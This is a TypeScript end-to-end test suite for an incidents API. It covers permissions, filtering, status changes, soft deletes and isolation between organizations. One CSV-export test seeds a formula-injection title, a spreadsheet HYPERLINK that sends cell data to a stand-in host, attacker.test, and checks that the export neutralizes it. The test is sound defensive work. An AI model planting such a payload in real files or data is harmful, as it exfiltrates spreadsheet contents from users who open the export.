import { INestApplication } from '@nestjs/common';
import request from 'supertest';
import type { App } from 'supertest/types';
import { createTestApp } from './utils/test-app';
import type {
  FakePrismaService,
  FakeUser,
  FakeProject,
  FakeIncidentType,
} from './utils/fake-prisma.service';

interface AccessTokenBody {
  accessToken: string;
}

interface IncidentBody {
  id: string;
  sequenceId: string;
  title: string;
  status: string;
  closingDate: string | null;
}

interface PaginatedIncidentsBody {
  items: IncidentBody[];
  total: number;
  page: number;
  pageSize: number;
}

async function loginAs(
  app: INestApplication<App>,
  user: FakeUser,
  password: string,
): Promise<string> {
  const res = await request(app.getHttpServer())
    .post('/auth/login')
    .send({ email: user.email, password })
    .expect(200);
  return (res.body as AccessTokenBody).accessToken;
}

describe('Incidents (e2e)', () => {
  let app: INestApplication<App>;
  let prisma: FakePrismaService;
  let orgAMember: FakeUser;
  let orgAOtherMember: FakeUser;
  let orgAAdmin: FakeUser;
  let orgBAdmin: FakeUser;
  let projectA: FakeProject;
  let projectB: FakeProject;
  let plumbingType: FakeIncidentType;

  beforeEach(async () => {
    ({ app, prisma } = await createTestApp());
    orgAMember = await prisma.seedUser({
      email: 'member@org-a.test',
      password: 'password123',
      orgId: 'org-a',
      role: 'member',
      name: 'Org A Member',
    });
    orgAOtherMember = await prisma.seedUser({
      email: 'other@org-a.test',
      password: 'password123',
      orgId: 'org-a',
      role: 'member',
      name: 'Org A Other Member',
    });
    orgAAdmin = await prisma.seedUser({
      email: 'admin@org-a.test',
      password: 'password123',
      orgId: 'org-a',
      role: 'admin',
      name: 'Org A Admin',
    });
    orgBAdmin = await prisma.seedUser({
      email: 'admin@org-b.test',
      password: 'password123',
      orgId: 'org-b',
      role: 'admin',
      name: 'Org B Admin',
    });
    projectA = await prisma.seedProject({
      orgId: 'org-a',
      name: 'Edificio Cedro Real',
    });
    projectB = await prisma.seedProject({
      orgId: 'org-b',
      name: 'Los Almendros',
    });
    plumbingType = await prisma.seedIncidentType({
      key: 'plumbing',
      name: 'Hidrosanitario',
      nameEn: 'Plumbing',
    });
  });

  afterEach(async () => {
    await app.close();
  });

  describe('POST /incidents', () => {
    it('creates an incident owned by the authenticated user, with a generated sequenceId', async () => {
      const token = await loginAs(app, orgAMember, 'password123');

      const res = await request(app.getHttpServer())
        .post('/incidents')
        .set('Authorization', `Bearer ${token}`)
        .send({
          projectId: projectA.id,
          typeId: plumbingType.id,
          title: 'Leaking pipe',
          description: 'Water leak on floor 3',
          priority: 'high',
        })
        .expect(201);

      expect(res.body).toMatchObject({
        title: 'Leaking pipe',
        status: 'open',
        approval: 'pending',
        deleted: false,
        owner: { id: orgAMember.id },
        orgId: 'org-a',
      });
      expect((res.body as IncidentBody).sequenceId).toBe('0001');
    });

    it('rejects a projectId from another organization with 400', async () => {
      const token = await loginAs(app, orgAMember, 'password123');

      await request(app.getHttpServer())
        .post('/incidents')
        .set('Authorization', `Bearer ${token}`)
        .send({
          projectId: projectB.id,
          typeId: plumbingType.id,
          title: 'Cross-org attempt',
          description: 'Should be rejected',
          priority: 'low',
        })
        .expect(400);
    });

    it('rejects an unknown typeId with 400', async () => {
      const token = await loginAs(app, orgAMember, 'password123');

      await request(app.getHttpServer())
        .post('/incidents')
        .set('Authorization', `Bearer ${token}`)
        .send({
          projectId: projectA.id,
          typeId: '00000000-0000-4000-8000-000000000000',
          title: 'Unknown type',
          description: 'Should be rejected',
          priority: 'low',
        })
        .expect(400);
    });

    it('rejects a missing title with 400 (validation)', async () => {
      const token = await loginAs(app, orgAMember, 'password123');

      await request(app.getHttpServer())
        .post('/incidents')
        .set('Authorization', `Bearer ${token}`)
        .send({
          projectId: projectA.id,
          typeId: plumbingType.id,
          description: 'No title',
          priority: 'low',
        })
        .expect(400);
    });
  });

  describe('GET /incidents', () => {
    beforeEach(async () => {
      await prisma.seedIncident({
        orgId: 'org-a',
        projectId: projectA.id,
        typeId: plumbingType.id,
        ownerId: orgAMember.id,
        title: 'Open high priority',
        priority: 'high',
        status: 'open',
      });
      await prisma.seedIncident({
        orgId: 'org-a',
        projectId: projectA.id,
        typeId: plumbingType.id,
        ownerId: orgAMember.id,
        title: 'Closed low priority',
        priority: 'low',
        status: 'closed',
      });
      await prisma.seedIncident({
        orgId: 'org-a',
        projectId: projectA.id,
        typeId: plumbingType.id,
        ownerId: orgAMember.id,
        title: 'Already deleted',
        priority: 'medium',
        status: 'open',
        deleted: true,
      });
      await prisma.seedIncident({
        orgId: 'org-b',
        projectId: projectB.id,
        typeId: plumbingType.id,
        ownerId: orgBAdmin.id,
        title: 'Other org incident',
        priority: 'high',
        status: 'open',
      });
    });

    it('lists only non-deleted incidents scoped to the caller organization', async () => {
      const token = await loginAs(app, orgAMember, 'password123');

      const res = await request(app.getHttpServer())
        .get('/incidents')
        .set('Authorization', `Bearer ${token}`)
        .expect(200);

      const body = res.body as PaginatedIncidentsBody;
      expect(body.total).toBe(2);
      const titles = body.items.map((i) => i.title);
      expect(titles.sort()).toEqual(
        ['Closed low priority', 'Open high priority'].sort(),
      );
    });

    it('filters by status', async () => {
      const token = await loginAs(app, orgAMember, 'password123');

      const res = await request(app.getHttpServer())
        .get('/incidents?status=closed')
        .set('Authorization', `Bearer ${token}`)
        .expect(200);

      const body = res.body as PaginatedIncidentsBody;
      expect(body.total).toBe(1);
      expect(body.items[0].title).toBe('Closed low priority');
    });

    it('filters by priority', async () => {
      const token = await loginAs(app, orgAMember, 'password123');

      const res = await request(app.getHttpServer())
        .get('/incidents?priority=high')
        .set('Authorization', `Bearer ${token}`)
        .expect(200);

      const body = res.body as PaginatedIncidentsBody;
      expect(body.total).toBe(1);
      expect(body.items[0].title).toBe('Open high priority');
    });

    it('paginates with page/pageSize', async () => {
      const token = await loginAs(app, orgAMember, 'password123');

      const res = await request(app.getHttpServer())
        .get('/incidents?page=1&pageSize=1')
        .set('Authorization', `Bearer ${token}`)
        .expect(200);

      const body = res.body as PaginatedIncidentsBody;
      expect(body.items).toHaveLength(1);
      expect(body.total).toBe(2);
      expect(body.page).toBe(1);
      expect(body.pageSize).toBe(1);
    });

    it('rejects an invalid status filter with 400', async () => {
      const token = await loginAs(app, orgAMember, 'password123');

      await request(app.getHttpServer())
        .get('/incidents?status=not-a-status')
        .set('Authorization', `Bearer ${token}`)
        .expect(400);
    });
  });

  describe('GET /incidents/export.csv', () => {
    // F9.4 — CSV injection (CWE-1236). The unit spec covers the serializer;
    // this is the wiring proof, that a title typed by a user really does
    // reach the export through it rather than around it.
    it('neutralizes a formula-shaped title so the export cannot execute in a spreadsheet', async () => {
      const token = await loginAs(app, orgAMember, 'password123');
      await prisma.seedIncident({
        orgId: 'org-a',
        projectId: projectA.id,
        typeId: plumbingType.id,
        ownerId: orgAMember.id,
        title: '=HYPERLINK("https://attacker.test/?d="&A1,"Ver informe")',
        priority: 'high',
        status: 'open',
      });

      const res = await request(app.getHttpServer())
        .get('/incidents/export.csv')
        .set('Authorization', `Bearer ${token}`)
        .expect(200);

      const csv = res.text;
      expect(csv).toContain(`'=HYPERLINK(`);
      // The cell no longer *starts* with `=`, which is the whole condition a
      // spreadsheet uses to decide it is looking at a formula.
      expect(csv).not.toContain(',=HYPERLINK(');
      expect(csv).not.toContain('"=HYPERLINK(');
    });
  });

  describe('GET /incidents/:id', () => {
    it('returns 404 for an incident belonging to another organization', async () => {
      const token = await loginAs(app, orgAMember, 'password123');
      const otherIncident = await prisma.seedIncident({
        orgId: 'org-b',
        projectId: projectB.id,
        typeId: plumbingType.id,
        ownerId: orgBAdmin.id,
        title: 'Other org incident',
        priority: 'high',
      });

      await request(app.getHttpServer())
        .get(`/incidents/${otherIncident.id}`)
        .set('Authorization', `Bearer ${token}`)
        .expect(404);
    });

    it('returns 404 for a soft-deleted incident', async () => {
      const token = await loginAs(app, orgAMember, 'password123');
      const deleted = await prisma.seedIncident({
        orgId: 'org-a',
        projectId: projectA.id,
        typeId: plumbingType.id,
        ownerId: orgAMember.id,
        title: 'Deleted incident',
        priority: 'high',
        deleted: true,
      });

      await request(app.getHttpServer())
        .get(`/incidents/${deleted.id}`)
        .set('Authorization', `Bearer ${token}`)
        .expect(404);
    });
  });

  describe('PATCH /incidents/:id', () => {
    it('lets the owner edit their own incident', async () => {
      const token = await loginAs(app, orgAMember, 'password123');
      const incident = await prisma.seedIncident({
        orgId: 'org-a',
        projectId: projectA.id,
        typeId: plumbingType.id,
        ownerId: orgAMember.id,
        title: 'Original title',
        priority: 'low',
      });

      const res = await request(app.getHttpServer())
        .patch(`/incidents/${incident.id}`)
        .set('Authorization', `Bearer ${token}`)
        .send({ title: 'Updated title' })
        .expect(200);

      expect((res.body as IncidentBody).title).toBe('Updated title');
    });

    it('lets an admin edit an incident they do not own', async () => {
      const token = await loginAs(app, orgAAdmin, 'password123');
      const incident = await prisma.seedIncident({
        orgId: 'org-a',
        projectId: projectA.id,
        typeId: plumbingType.id,
        ownerId: orgAMember.id,
        title: 'Owned by member',
        priority: 'low',
      });

      await request(app.getHttpServer())
        .patch(`/incidents/${incident.id}`)
        .set('Authorization', `Bearer ${token}`)
        .send({ title: 'Edited by admin' })
        .expect(200);
    });

    it('rejects an unrelated member with 403', async () => {
      const token = await loginAs(app, orgAOtherMember, 'password123');
      const incident = await prisma.seedIncident({
        orgId: 'org-a',
        projectId: projectA.id,
        typeId: plumbingType.id,
        ownerId: orgAMember.id,
        title: 'Owned by member',
        priority: 'low',
      });

      await request(app.getHttpServer())
        .patch(`/incidents/${incident.id}`)
        .set('Authorization', `Bearer ${token}`)
        .send({ title: 'Should be rejected' })
        .expect(403);
    });

    it('lets an assignee edit the incident', async () => {
      const token = await loginAs(app, orgAOtherMember, 'password123');
      const incident = await prisma.seedIncident({
        orgId: 'org-a',
        projectId: projectA.id,
        typeId: plumbingType.id,
        ownerId: orgAMember.id,
        title: 'Owned by member',
        priority: 'low',
        assigneeIds: [orgAOtherMember.id],
      });

      await request(app.getHttpServer())
        .patch(`/incidents/${incident.id}`)
        .set('Authorization', `Bearer ${token}`)
        .send({ title: 'Edited by assignee' })
        .expect(200);
    });
  });

  describe('PATCH /incidents/:id/status', () => {
    it('allows an open -> on_pause transition', async () => {
      const token = await loginAs(app, orgAMember, 'password123');
      const incident = await prisma.seedIncident({
        orgId: 'org-a',
        projectId: projectA.id,
        typeId: plumbingType.id,
        ownerId: orgAMember.id,
        title: 'Incident',
        priority: 'low',
        status: 'open',
      });

      const res = await request(app.getHttpServer())
        .patch(`/incidents/${incident.id}/status`)
        .set('Authorization', `Bearer ${token}`)
        .send({ status: 'on_pause' })
        .expect(200);

      expect((res.body as IncidentBody).status).toBe('on_pause');
    });

    it('sets closingDate when transitioning to closed', async () => {
      const token = await loginAs(app, orgAMember, 'password123');
      const incident = await prisma.seedIncident({
        orgId: 'org-a',
        projectId: projectA.id,
        typeId: plumbingType.id,
        ownerId: orgAMember.id,
        title: 'Incident',
        priority: 'low',
        status: 'open',
      });

      const res = await request(app.getHttpServer())
        .patch(`/incidents/${incident.id}/status`)
        .set('Authorization', `Bearer ${token}`)
        .send({ status: 'closed' })
        .expect(200);

      const body = res.body as IncidentBody;
      expect(body.status).toBe('closed');
      expect(body.closingDate).not.toBeNull();
    });

    it('rejects a same-state transition with 409', async () => {
      const token = await loginAs(app, orgAMember, 'password123');
      const incident = await prisma.seedIncident({
        orgId: 'org-a',
        projectId: projectA.id,
        typeId: plumbingType.id,
        ownerId: orgAMember.id,
        title: 'Incident',
        priority: 'low',
        status: 'open',
      });

      await request(app.getHttpServer())
        .patch(`/incidents/${incident.id}/status`)
        .set('Authorization', `Bearer ${token}`)
        .send({ status: 'open' })
        .expect(409);
    });
  });

  describe('DELETE /incidents/:id', () => {
    it('lets the owner soft delete their own incident, hiding it from the default list', async () => {
      const token = await loginAs(app, orgAMember, 'password123');
      const incident = await prisma.seedIncident({
        orgId: 'org-a',
        projectId: projectA.id,
        typeId: plumbingType.id,
        ownerId: orgAMember.id,
        title: 'To be deleted',
        priority: 'low',
      });

      await request(app.getHttpServer())
        .delete(`/incidents/${incident.id}`)
        .set('Authorization', `Bearer ${token}`)
        .expect(204);

      await request(app.getHttpServer())
        .get(`/incidents/${incident.id}`)
        .set('Authorization', `Bearer ${token}`)
        .expect(404);
    });

    it('rejects an unrelated member (not owner, not admin) with 403', async () => {
      const token = await loginAs(app, orgAOtherMember, 'password123');
      const incident = await prisma.seedIncident({
        orgId: 'org-a',
        projectId: projectA.id,
        typeId: plumbingType.id,
        ownerId: orgAMember.id,
        title: 'Owned by member',
        priority: 'low',
      });

      await request(app.getHttpServer())
        .delete(`/incidents/${incident.id}`)
        .set('Authorization', `Bearer ${token}`)
        .expect(403);
    });

    it('rejects an assignee who is not the owner with 403 (delete is stricter than edit)', async () => {
      const token = await loginAs(app, orgAOtherMember, 'password123');
      const incident = await prisma.seedIncident({
        orgId: 'org-a',
        projectId: projectA.id,
        typeId: plumbingType.id,
        ownerId: orgAMember.id,
        title: 'Owned by member',
        priority: 'low',
        assigneeIds: [orgAOtherMember.id],
      });

      await request(app.getHttpServer())
        .delete(`/incidents/${incident.id}`)
        .set('Authorization', `Bearer ${token}`)
        .expect(403);
    });
  });
});
